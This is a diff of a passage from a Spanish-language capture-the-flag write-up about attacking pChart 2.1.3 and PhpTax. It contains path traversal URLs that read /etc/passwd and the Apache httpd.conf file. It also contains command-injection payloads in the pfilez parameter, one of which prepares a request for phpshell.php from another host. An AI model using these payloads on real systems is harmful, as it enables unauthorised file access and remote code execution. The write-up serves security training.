@@ -9,6 +9,8 @@ pChart2.1.3/index.php
 ?Action=View&Script=%2f..%2f..%2fetc/passwd PATH TRAVERSAL
 
 Por arte de magia, tras no saber qué hacer, leo de un writeup que hay que usar el User Agent de Internet Explorer 6.1 (Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)) así que tiro por ahí, y veo un directorio nada más acceder a la IP: /phptax/
+UPDATE: Al acceder a /../../../../../usr/local/etc/apache22/httpd.conf se ve
+  SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
 
 /phptax/index.php?pfilez=1040d1-pg2.tob;pwd > pwd.txt";&pdf=make
 /phptax/index.php?pfilez=1040d1-pg2.tob;printf "GET http://192.168.111.128/phpshell.php HTTP/1.0\r\n\r\n" > get.txt
